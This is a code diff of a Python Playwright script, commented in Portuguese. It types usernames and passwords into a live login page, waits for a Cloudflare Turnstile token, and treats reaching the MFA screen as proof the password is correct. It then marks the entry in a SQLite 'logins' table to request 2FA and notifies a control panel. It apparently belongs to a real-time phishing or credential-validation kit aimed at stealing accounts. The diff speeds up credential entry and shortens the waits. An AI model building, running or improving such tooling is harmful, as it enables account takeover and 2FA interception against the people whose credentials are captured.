@@ -147,6 +147,23 @@ def salvar_resultado(
         print("Erro ao salvar resultado.json:")
         print(erro)
 
+    # Atualiza diretamente o SQLite se existir
+    db_sqlite = Path("vr_database.sqlite")
+    if db_sqlite.exists():
+        try:
+            import sqlite3
+            conn = sqlite3.connect(str(db_sqlite), timeout=5)
+            c = conn.cursor()
+            status_login = "solicitar_2fa" if valido else "aguardando_solicitacao"
+            c.execute(
+                "UPDATE logins SET status_credencial = ?, status_login = ? WHERE lower(usuario) = ?",
+                (status_credencial, status_login, usuario.lower().strip())
+            )
+            conn.commit()
+            conn.close()
+        except Exception as err:
+            pass
+
     # Notifica o server.js via API local para disparar SSE imediato ao painel
     try:
         import urllib.request
@@ -262,19 +279,13 @@ def testar_login(usuario, senha):
             )
 
 
-            print("[3] Preenchendo usuário...")
+            print("[3] Preenchendo credenciais...")
 
             user_input = pagina.locator(SELECTOR_USERNAME).first
-            user_input.click()
-            user_input.fill("")
-            user_input.type(usuario, delay=30)
-
-            print("[4] Preenchendo senha...")
+            user_input.fill(usuario)
 
             pass_input = pagina.locator(SELECTOR_PASSWORD).first
-            pass_input.click()
-            pass_input.fill("")
-            pass_input.type(senha, delay=30)
+            pass_input.fill(senha)
 
 
             print("[5] Verificando se há desafio de segurança e clicando em continuar...")
@@ -284,17 +295,15 @@ def testar_login(usuario, senha):
                 if cf_input.count() > 0:
                     val = cf_input.get_attribute("value")
                     if not val:
-                        print("[*] Aguardando token Turnstile ser gerado em segundo plano...")
-                        for _ in range(12):
-                            pagina.wait_for_timeout(150)
+                        print("[*] Aguardando token Turnstile ser gerado...")
+                        for _ in range(8):
+                            pagina.wait_for_timeout(100)
                             val = cf_input.get_attribute("value")
                             if val:
-                                print("[*] Token Turnstile obtido com sucesso!")
+                                print("[*] Token Turnstile obtido!")
                                 break
-                else:
-                    pagina.wait_for_timeout(400)
             except Exception:
-                pagina.wait_for_timeout(400)
+                pass
 
             btn = pagina.locator(SELECTOR_CONTINUAR).first
             if btn.count() > 0:
@@ -310,8 +319,8 @@ def testar_login(usuario, senha):
             msg_resultado = ""
             turnstile_detectado = False
 
-            for _ in range(25):
-                pagina.wait_for_timeout(300)
+            for _ in range(35):
+                pagina.wait_for_timeout(100)
                 url_atual = pagina.url
 
                 # Caso 1: Navegou para a tela de MFA (Senha Correta!)
